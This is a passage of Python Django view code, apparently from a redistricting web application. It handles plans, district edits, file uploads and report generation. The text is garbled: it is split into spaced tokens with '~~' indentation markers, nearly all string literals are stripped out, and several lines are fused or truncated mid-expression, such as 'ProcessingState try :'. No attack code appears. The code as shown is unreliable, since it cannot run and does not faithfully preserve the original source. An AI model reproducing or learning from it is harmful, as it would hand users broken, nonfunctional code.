: 512 \n 
} ) \n 
overlayImg = Image . blend ( overlayImg , ModestMaps . mapByExtent ( provider , ll , ur , dims ) . draw ( ) , \n 
# composite the overlay onto the base, using the mask (from geography) \n 
fullImg = Image . composite ( fullImg , Image . blend ( fullImg , overlayImg , opacity ) , maskImg ) \n 
\n 
\n 
# district line & label layer \n 
provider = ModestMaps . WMS . Provider ( cfg [ ] , { \n 
: cfg [ ] , \n 
: , \n 
: , \n 
: request . REQUEST [ ] , \n 
: 512 , \n 
: 512 \n 
} ) \n 
overlayImg = ModestMaps . mapByExtent ( provider , ll , ur , dims ) . draw ( ) \n 
\n 
# create an invert mask of the labels & lines \n 
maskImg = ImageChops . invert ( overlayImg ) \n 
\n 
# composite the district labels on top of the composited basemap, geography & district areas fullImg = Image . composite ( fullImg , Image . blend ( fullImg , overlayImg , opacity ) , maskImg ) \n 
\n 
# save \n 
fullImg . save ( settings . WEB_TEMP + ( % sha . hexdigest ( ) ) , , quality = 100 ) \n 
\n 
# render pg to a string \n 
t = loader . get_template ( ) \n 
page = t . render ( DjangoContext ( cfg ) ) \n 
result = StringIO . StringIO ( ) \n 
\n 
\n 
# as allowing the method to set an encoding itself fixes the problem. \n 
# we may need to find an alternate strategy if it finds encodings that \n 
\n 
CreatePDF ( page , result , show_error_as_pdf = True ) \n 
\n 
response = HttpResponse ( result . getvalue ( ) , mimetype = ) \n 
response [ ] = \n 
\n 
return response \n 
\n 
~~ else : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ ~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def createplan ( request ) : \n 
~~~ """\n    Create a plan.\n\n    Create a plan from a POST request. This plan will be \'blank\', and will\n    contain only the Unassigned district initially.\n\n    Parameters:\n        request -- An HttpRequest, which contains the current user.\n\n    Returns:\n        A JSON HttpResponse, including the new plan\'s information, or an\n        error describing why the plan could not be created.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method == "POST" : \n 
~~~ name = request . POST [ ] [ 0 : 200 ] \n 
body = LegislativeBody . objects . get ( id = int ( request . POST [ ] ) ) \n 
plan = Plan ( name = name , owner = request . user , legislative_body = body , processing_state = ProcessingState try : \n 
~~~ plan . save ( ) \n 
status = serializers . serialize ( "json" , [ plan ] ) \n 
~~ except : \n 
~~~ status = { : False , : _ ( "Couldn\'t save new plan" ) } \n 
~~ ~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def uploadfile ( request ) : \n 
~~~ """\n    Accept a block equivalency file, and create a plan based on that\n    file.\n\n    Parameters:\n        request -- An HttpRequest, with a file upload and plan name.\n\n    Returns:\n        A plan view, with additional information about the upload status.\n    """ \n 
note_session_activity ( request ) \n 
\n 
if request . user . is_anonymous ( ) : \n 
# If a user is logged off from another location, they will appear \n 
# as an anonymous user. Redirect them to the front page. Sadly, \n 
# they will not get a notice that they were logged out. \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ status = commonplan ( request , 0 ) \n 
status [ ] = True \n 
status [ ] = True \n 
\n 
index_file = request . FILES . get ( , False ) \n 
if not index_file : \n 
~~~ status [ ] = False \n 
return render_to_response ( , status ) \n 
~~ else : \n 
~~~ filename = index_file . name \n 
\n 
~~ if index_file . size > settings . MAX_UPLOAD_SIZE : \n 
~~~ logger . error ( ) \n 
status [ ] = False \n 
return render_to_response ( , status ) \n 
\n 
~~ if not filename . endswith ( ( , ) ) : \n 
~~~ logger . error ( \'Uploaded file must be ".csv" or ".zip".\' ) \n 
status [ ] = False \n 
~~ elif request . POST [ ] == : \n 
~~~ logger . error ( ) \n 
status [ ] = False \n 
~~ else : \n 
~~~ try : \n 
~~~ dest = tempfile . NamedTemporaryFile ( mode = , delete = False ) \n 
for chunk in request . FILES [ ] . chunks ( ) : \n 
~~~ dest . write ( chunk ) \n 
~~ dest . close ( ) \n 
if request . FILES [ ] . name . endswith ( ) : \n 
~~~ os . rename ( dest . name , % ( dest . name , ) ) \n 
filename = % ( dest . name , ) \n 
~~ else : \n 
~~~ filename = dest . name \n 
\n 
~~ ~~ except Exception as ex : \n 
~~~ logger . error ( ) \n 
logger . error ( , ex ) \n 
status [ ] = False \n 
return render_to_response ( , status ) \n 
\n 
# Put in a celery task to create the plan and email user on completion \n 
~~ DistrictIndexFile . index2plan . delay ( request . POST [ ] , request . POST [ \n 
~~ return render_to_response ( , status ) \n 
\n 
~~ def generate_report_hash ( qdict ) : \n 
~~~ """\n    Generate a hash based on the query items passed to this report request.\n    """ \n 
\n 
params = qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) \n 
sha = hashlib . sha1 ( ) \n 
sha . update ( params ) \n 
return sha . hexdigest ( ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getreport ( request , planid ) : \n 
~~~ """\n    Get a BARD report.\n\n    This view will write out an HTML-formatted BARD report to the directory\n    given in the settings.\n    \n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan to be reported.\n    \n    Returns:\n        The HTML for use as a preview in the web application, along with \n        the web address of the BARD report.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_view ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not settings . REPORTS_ENABLED is None : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the variables from the request \n 
~~ if request . method != : \n 
~~~ status [ ] = _ ( "Information for report wasn\'t sent via POST" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ stamp = request . POST . get ( , generate_report_hash ( request . POST ) ) \n 
\n 
rptstatus = PlanReport . checkreport ( planid , stamp ) \n 
if rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: PlanReport . getreport ( planid , stamp ) , \n 
: 0 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getreport , args = [ planid ] ) , \n 
: 10 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getreport , args = [ planid ] ) , \n 
: 10 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
\n 
req = { \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . getlist ( ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) \n 
} \n 
\n 
PlanReport . markpending ( planid , stamp ) \n 
PlanReport . createreport . delay ( planid , stamp , req , language = translation . get_language ( ) ) \n 
~~ else : \n 
~~~ status [ ] = _ ( \n 
) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getcalculatorreport ( request , planid ) : \n 
~~~ """\n    Get a report which is generated by using calculators.\n\n    This view will write out an HTML-formatted report to the directory\n    given in the settings.\n    \n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan to be reported.\n    \n    Returns:\n        The HTML for use as a preview in the web application, along with \n        the web address of the report.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_view ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if request . method != : \n 
~~~ status [ ] = _ ( "Information for report wasn\'t sent via POST" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# extract the function ids from the POST \n 
~~ function_ids = request . POST . get ( , ) \n 
\n 
# generate a hash of the function ids \n 
sha = hashlib . sha1 ( ) \n 
sha . update ( function_ids ) \n 
stamp = request . POST . get ( , sha . hexdigest ( ) ) \n 
\n 
rptstatus = CalculatorReport . checkreport ( planid , stamp ) \n 
if rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: CalculatorReport . getreport ( planid , stamp ) , \n 
: 0 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getcalculatorreport , args = [ planid ] ) , \n 
: 5 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getcalculatorreport , args = [ planid ] ) , \n 
: 5 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
\n 
req = { : function_ids } \n 
CalculatorReport . markpending ( planid , stamp ) \n 
CalculatorReport . createcalculatorreport . delay ( planid , stamp , req , language = translation . get_language ~~ else : \n 
~~~ status [ ] = _ ( \n 
) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def newdistrict ( request , planid ) : \n 
~~~ """\n    Create a new district.\n\n    The \'geolevel\' parameter is required to create a new district. Geounits\n    may be added to this new district by setting the \'geounits\' key in the\n    request.  \n\n    Parameters:\n        request - An HttpRequest, with the current user.\n        planid - The plan id to which the district should be added.\n    \n    Returns:\n        The new District\'s name and district_id.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if len ( request . REQUEST . items ( ) ) >= 3 : \n 
~~~ plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
\n 
if in request . REQUEST : \n 
~~~ geolevel = request . REQUEST [ ] \n 
~~ else : \n 
~~~ geolevel = None \n 
~~ if in request . REQUEST : \n 
~~~ geounit_ids = string . split ( request . REQUEST [ ] , ) \n 
~~ else : \n 
~~~ geounit_ids = None \n 
\n 
~~ if in request . REQUEST : \n 
~~~ district_id = int ( request . REQUEST [ ] ) \n 
~~ else : \n 
~~~ district_id = None \n 
\n 
~~ if in request . REQUEST : \n 
~~~ district_short = request . REQUEST [ ] [ 0 : 10 ] \n 
~~ elif not district_id is None : \n 
~~~ district_short = plan . legislative_body . get_short_label ( ) % { : district_id } \n 
~~ else : \n 
~~~ district_short = None \n 
\n 
~~ if in request . REQUEST : \n 
~~~ district_long = request . REQUEST [ ] [ 0 : 256 ] \n 
~~ elif not district_id is None : \n 
~~~ district_long = plan . legislative_body . get_label ( ) % { : district_id } \n 
~~ else : \n 
~~~ district_long = None \n 
\n 
~~ if in request . REQUEST : \n 
~~~ version = request . REQUEST [ ] \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ if geolevel and geounit_ids and district_id : \n 
~~~ try : \n 
# add the geounits selected to this district -- this will \n 
# create a new district w/1 version higher \n 
~~~ fixed = plan . add_geounits ( ( district_id , district_short , district_long , ) , geounit_ids \n 
# if there are comments, types or multiple members, add them to the district \n 
district = plan . district_set . filter ( district_id = district_id , short_label = district_short if plan . legislative_body . multi_members_allowed : \n 
~~~ district . num_members = plan . legislative_body . min_multi_district_members \n 
district . save ( ) \n 
~~ ct = ContentType . objects . get ( app_label = , model = ) \n 
if in request . POST and request . POST [ ] != : \n 
~~~ comment = Comment ( \n 
object_pk = district . id , \n 
content_type = ct , \n 
site_id = Site . objects . get_current ( ) . id , \n 
user_name = request . user . username , \n 
user_email = request . user . email , \n 
comment = request . POST [ ] ) \n 
comment . save ( ) \n 
\n 
~~ if len ( request . REQUEST . getlist ( ) ) > 0 : \n 
~~~ strtags = request . REQUEST . getlist ( ) \n 
for strtag in strtags : \n 
~~~ if strtag == : \n 
~~~ continue \n 
~~ if strtag . count ( ) > 0 : \n 
~~~ strtag = \'"type=%s"\' % strtag \n 
~~ else : \n 
~~~ strtag = % strtag \n 
~~ Tag . objects . add_tag ( district , strtag ) \n 
\n 
~~ ~~ status [ ] = True \n 
status [ ] = _ ( ) \n 
plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
status [ ] = getutc ( plan . edited ) . isoformat ( ) \n 
status [ ] = district_id \n 
status [ ] = plan . version \n 
~~ except ValidationError : \n 
~~~ status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( ) \n 
logger . debug ( , ex ) \n 
status [ ] = _ ( "Couldn\'t save new district." ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( ) \n 
~~ ~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
@ transaction . commit_manually \n 
def add_districts_to_plan ( request , planid ) : \n 
~~~ """\n    This handler is used to paste existing districts from one\n    plan into another plan\n    \n    Parameters:\n        request -- An HttpRequest object including a list of districtids and\n            a version\n        planid -- The plan into which to paste the districts\n\n    Returns:\n        Some JSON explaining the success or failure of the paste operation\n    """ \n 
\n 
status = { : False } \n 
\n 
# Make sure we can edit the given plan \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the districts we want to merge \n 
~~ district_list = request . POST . getlist ( ) \n 
if len ( district_list ) == 0 : \n 
~~~ status [ ] = _ ( "No districts selected to add to the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
~~ else : \n 
~~~ districts = District . objects . filter ( id__in = district_list ) \n 
version = int ( request . POST . get ( , None ) ) \n 
status [ ] = _ ( ) % { : len ( districts ) } \n 
\n 
# Check to see if we have enough room to add these districts without \n 
# going over MAX_DISTRICTS for the legislative_body \n 
~~ allowed_districts = plan . get_available_districts ( version = version ) \n 
\n 
if len ( districts ) > allowed_districts : \n 
~~~ status [ ] = _ ( ) % { : allowed_districts } \n 
\n 
\n 
~~ try : \n 
~~~ results = plan . paste_districts ( districts , version = version ) \n 
transaction . commit ( ) \n 
status [ ] = True \n 
status [ ] = _ ( ) % { status [ ] = plan . version \n 
~~ except Exception as ex : \n 
~~~ transaction . rollback ( ) \n 
status [ ] = str ( ex ) \n 
status [ ] = traceback . format_exc ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
@ transaction . commit_manually \n 
def assign_district_members ( request , planid ) : \n 
~~~ """\n    This handler is used to assign members to districts\n    \n    Parameters:\n        request -- An HttpRequest object including a version,\n                   and a mapping of districtids to num_members\n        planid -- The plan into which to assign district members\n\n    Returns:\n        Some JSON explaining the success or failure of the paste operation\n    """ \n 
\n 
status = { : False } \n 
\n 
# Make sure we can edit the given plan \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Make sure this district allows multi-member assignment \n 
~~ leg_bod = plan . legislative_body \n 
if ( not leg_bod . multi_members_allowed ) : \n 
~~~ status [ ] = _ ( \n 
) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the districts we want to assign members to \n 
~~ districts = request . POST . getlist ( ) \n 
counts = request . POST . getlist ( ) \n 
version = int ( request . POST . get ( , None ) ) \n 
\n 
# Assign the district members and return status \n 
try : \n 
~~~ changed = 0 \n 
for i in range ( 0 , len ( districts ) ) : \n 
~~~ id = int ( districts [ i ] ) \n 
count = int ( counts [ i ] ) \n 
district = District . objects . filter ( plan = plan , district_id = id , version__lte = version ) . order_by \n 
if district . num_members != count : \n 
~~~ if ( changed == 0 ) : \n 
# If there is at least one change, update the plan \n 
~~~ if version != plan . version : \n 
~~~ plan . purge ( after = version ) \n 
\n 
~~ plan . version = plan . version + 1 \n 
plan . save ( ) \n 
\n 
~~ plan . update_num_members ( district , count ) \n 
changed += 1 \n 
\n 
~~ ~~ transaction . commit ( ) \n 
status [ ] = True \n 
status [ ] = plan . version \n 
status [ ] = changed \n 
status [ ] = _ ( \n 
) % { : changed } \n 
~~ except Exception , ex : \n 
~~~ transaction . rollback ( ) \n 
status [ ] = str ( ex ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def combine_districts ( request , planid ) : \n 
~~~ """\n    Take the contents of one district and add them to another districts\n    """ \n 
\n 
status = { : False } \n 
\n 
# Make sure we can edit the given plan \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the districts we want to merge \n 
~~ version = int ( request . POST . get ( , plan . version ) ) \n 
from_id = int ( request . POST . get ( , - 1 ) ) \n 
to_id = int ( request . POST . get ( , None ) ) \n 
\n 
try : \n 
~~~ all_districts = plan . get_districts_at_version ( version , include_geom = True ) \n 
\n 
from_districts = filter ( lambda d : True if d . district_id == from_id else False , all_districts to_district = filter ( lambda d : True if d . district_id == to_id else False , all_districts ) [ 0 ] \n 
\n 
locked = to_district . is_locked \n 
for district in from_districts : \n 
~~~ if district . is_locked : \n 
~~~ locked = True \n 
\n 
~~ ~~ if locked : \n 
~~~ status [ ] = _ ( "Can\'t combine locked districts" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ result = plan . combine_districts ( to_district , from_districts , version = version ) \n 
\n 
if result [ 0 ] == True : \n 
~~~ status [ ] = True \n 
status [ ] = _ ( ) \n 
status [ ] = result [ 1 ] \n 
~~ ~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def fix_unassigned ( request , planid ) : \n 
~~~ """\n    Assign unassigned base geounits that are fully contained\n    or adjacent to another district\n    """ \n 
\n 
status = { : False } \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ try : \n 
~~~ version = int ( request . POST . get ( , plan . version ) ) \n 
result = plan . fix_unassigned ( version ) \n 
status [ ] = result [ 0 ] \n 
status [ ] = result [ 1 ] \n 
status [ ] = plan . version \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ @ unique_session_or_json_redirect \n 
def get_splits ( request , planid , otherid , othertype ) : \n 
~~~ """\n    Find all splits between this plan and another plan\n\n    Parameters:\n        request -- An HttpRequest optionally containing version and/or otherversion\n        planid -- The plan ID\n        otherid -- The plan ID or geolevel ID to find splits with\n        othertype -- One of: \'plan\' or \'geolevel\'. For specifying otherid\n\n    Returns:\n        A JSON HttpResponse that contains an array of splits, given as arrays,\n        where the first item is the district_id of the district in this plan\n        which causes the split, and the second item is the district_id of the\n        district in the other plan or geolevel. When a geolevel is specified,\n        the portable_id will be used, rather than the district_id.\n    """ \n 
\n 
otherid = int ( otherid ) \n 
status = { : False } \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_view ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ version = int ( request . REQUEST [ ] if in request . REQUEST else plan . version ) \n 
try : \n 
~~~ if othertype == : \n 
~~~ try : \n 
~~~ otherplan = Plan . objects . get ( pk = otherid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
~~ if not can_view ( request . user , otherplan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ otherversion = int ( request . REQUEST [ ] if in request . REQUEST splits = plan . find_plan_splits ( otherplan , version , otherversion ) \n 
~~ elif othertype == : \n 
~~~ splits = plan . find_geolevel_splits ( otherid , version ) \n 
~~ else : \n 
~~~ status [ ] = _ ( ) % { : othertype } \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ split_word = _ ( ) if len ( splits ) == 1 else inflect . engine ( ) . plural ( _ ( ) ) \n 
\n 
status [ ] = True \n 
status [ ] = _ ( ) % { : len ( splits ) , : split_word } \n 
status [ ] = splits \n 
status [ ] = list ( set ( [ i [ 0 ] for i in splits ] ) ) \n 
status [ ] = list ( set ( [ i [ 1 ] for i in splits ] ) ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def get_processing_status ( request ) : \n 
~~~ """\n    Get the processing status for a list of plan ids\n    """ \n 
status = { : False } \n 
plan_ids = request . REQUEST . getlist ( ) \n 
if len ( plan_ids ) == 0 : \n 
~~~ status [ ] = _ ( ) \n 
~~ else : \n 
~~~ statuses = { } \n 
for p in Plan . objects . filter ( id__in = plan_ids ) : \n 
~~~ statuses [ str ( p . id ) ] = p . get_processing_state_display ( ) \n 
\n 
~~ status [ ] = True \n 
status [ ] = statuses \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def get_splits_report ( request , planid ) : \n 
~~~ """\n    Get the rendered splits report\n    """ \n 
note_session_activity ( request ) \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ return HttpResponse ( _ ( ) , mimetype = ) \n 
\n 
~~ if not using_unique_session ( request . user ) or not can_view ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ version = int ( request . REQUEST [ ] if in request . REQUEST else plan . version ) \n 
inverse = request . REQUEST [ ] == if in request . REQUEST else False \n 
extended = request . REQUEST [ ] == if in request . REQUEST else False \n 
layers = request . REQUEST . getlist ( ) \n 
if len ( layers ) == 0 : \n 
~~~ return HttpResponse ( _ ( ) , mimetype = ) \n 
\n 
~~ try : \n 
~~~ report = loader . get_template ( ) \n 
html = \n 
for layer in layers : \n 
~~~ my_context = { : extended } \n 
my_context . update ( plan . compute_splits ( layer , version = version , inverse = inverse , extended last_item = layer is layers [ - 1 ] \n 
community_info = plan . get_community_type_info ( layer , version = version , inverse = inverse if community_info is not None : \n 
~~~ my_context . update ( community_info ) \n 
~~ calc_context = DjangoContext ( my_context ) \n 
html += report . render ( calc_context ) \n 
if not last_item : \n 
~~~ html += \n 
~~ ~~ return HttpResponse ( html , mimetype = ) \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( str ( ex ) , mimetype = ) \n 
\n 
\n 
~~ ~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def addtodistrict ( request , planid , districtid ) : \n 
~~~ """\n    Add geounits to a district.\n\n    This method requires both "geolevel" and "geounits" URL parameters. \n    The geolevel must be a valid geolevel name and the geounits parameters \n    should be a pipe-separated list of geounit ids.\n\n    Parameters:\n        request -- An HttpRequest, with the current user, the geolevel, and\n        the pipe-separated geounit list.\n        planid -- The plan ID that contains the district.\n        districtid -- The district ID to which the geounits will be added.\n\n    Returns:\n        A JSON HttpResponse that contains the number of districts modified,\n        or an error message if adding fails.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
\n 
if len ( request . REQUEST . items ( ) ) >= 2 : \n 
~~~ try : \n 
~~~ geolevel = request . REQUEST [ "geolevel" ] \n 
geounit_ids = string . split ( request . REQUEST [ "geounits" ] , "|" ) \n 
plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
~~ except : \n 
~~~ status [ ] = traceback . format_exc ( ) \n 
status [ ] = _ ( ) \n 
\n 
# get the version from the request or the plan \n 
~~ if in request . REQUEST : \n 
~~~ version = request . REQUEST [ ] \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ try : \n 
~~~ fixed = plan . add_geounits ( districtid , geounit_ids , geolevel , version ) \n 
status [ ] = True ; \n 
status [ ] = _ ( ) % { : fixed } \n 
status [ ] = fixed \n 
plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
status [ ] = getutc ( plan . edited ) . isoformat ( ) \n 
status [ ] = plan . version \n 
~~ except Exception , ex : \n 
~~~ status [ ] = traceback . format_exc ( ) \n 
status [ ] = _ ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
\n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Geounits weren\'t found in a district." ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
@ login_required \n 
def setdistrictlock ( request , planid , district_id ) : \n 
~~~ """\n    Set whether this district is locked for editing.\n\n    Parameters:\n        request -- An HttpRequest, with a boolean that indicates whether the district\n        should be locked or unlocked\n        planid -- The plan ID that contains the district.\n        district_id -- The district_id to lock or unlock\n\n    Returns:\n        A JSON HttpResponse that contains a boolean of whether the district is locked.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
\n 
if request . method != : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ lock = request . POST . get ( ) . lower ( ) == \n 
version = request . POST . get ( ) \n 
if lock == None : \n 
~~~ status [ ] = _ ( ) \n 
~~ elif version == None : \n 
~~~ status [ ] = _ ( ) \n 
\n 
~~ try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
district = plan . district_set . filter ( district_id = district_id , version__lte = version ) . order_by ( ~~ except ObjectDoesNotExist : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if plan . owner != request . user : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ district . is_locked = lock \n 
district . save ( ) \n 
status [ ] = True \n 
status [ ] = _ ( ) % { : _ ( ) if lock else _ ( ) } \n 
\n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getdistricts ( request , planid ) : \n 
~~~ """\n    Get the districts in a plan at a specific version.\n\n    Parameters:\n        request - An HttpRequest, with the current user.\n        planid - The plan id to query for the districts.\n    Returns:\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
\n 
if in request . REQUEST : \n 
~~~ version = int ( request . REQUEST [ ] ) \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ districts = plan . get_districts_at_version ( version , include_geom = False ) \n 
\n 
status [ ] = [ ] \n 
\n 
# Same calculation as plan.get_available_districts, but \n 
# g_a_d fetches districts all over again -- skip that overhead \n 
status [ ] = plan . legislative_body . max_districts - len ( districts ) + 1 \n 
\n 
# Find the maximum version in the returned districts \n 
max_version = max ( [ d . version for d in districts ] ) \n 
\n 
\n 
# equal to the minimum stored version \n 
can_undo = max_version > plan . min_version \n 
\n 
for district in districts : \n 
~~~ status [ ] . append ( { \n 
: district . district_id , \n 
: . join ( map ( _ , district . short_label . split ( ) ) ) , \n 
: . join ( map ( _ , district . long_label . split ( ) ) ) , \n 
: district . version \n 
} ) \n 
~~ status [ ] = can_undo \n 
status [ ] = True \n 
\n 
~~ else : \n 
~~~ status [ ] = _ ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ def simple_district_versioned ( request , planid , district_ids = None ) : \n 
